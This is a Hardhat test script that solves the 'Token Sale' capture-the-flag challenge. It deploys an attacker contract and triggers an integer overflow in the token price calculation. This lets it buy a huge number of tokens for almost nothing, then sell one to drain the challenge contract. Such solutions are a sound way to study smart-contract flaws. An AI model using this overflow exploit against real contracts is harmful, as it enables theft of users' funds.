const {loadFixture} = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("TokenSaleChallenge", function () {
    describe("Corrupting market", function () {
        it("Exploiting...", async function () {
            const [owner] = await ethers.getSigners();
            const instanceAddr = "0xeC4239cb4020700E0A763f0F2e808C17e1dc2c7E";
           
            const instance = await ethers.getContractAt("ITokenSaleChallenge", instanceAddr);
            const NumberReference = await ethers.getContractFactory("TokenSaleChallengeAttacker");
            const nr = await NumberReference.deploy();
            await nr.deployed();

            console.log(`Deployed Number Reference at ${nr.address}`)

            const maxBeforeOverflow = await nr.getMaxAmountBeforeOverflow();
            
            // Using this amount of tokens will overflow numToken * 1 ether = numToken * 1 * 10**18 wei
            const maxThatOverflows = maxBeforeOverflow.add(1); // Adding 1 wei more.

            // Getting the exact value to send
            const exactValue = await nr.valueRequired(maxThatOverflows);

            await instance.connect(owner).buy(maxThatOverflows, {value: exactValue});
            const tx = await instance.connect(owner).sell(1); // Selling just 1 token will do the job.
            await tx.wait();

            expect(await instance.isComplete()).to.be.true;
            

        });
    });
});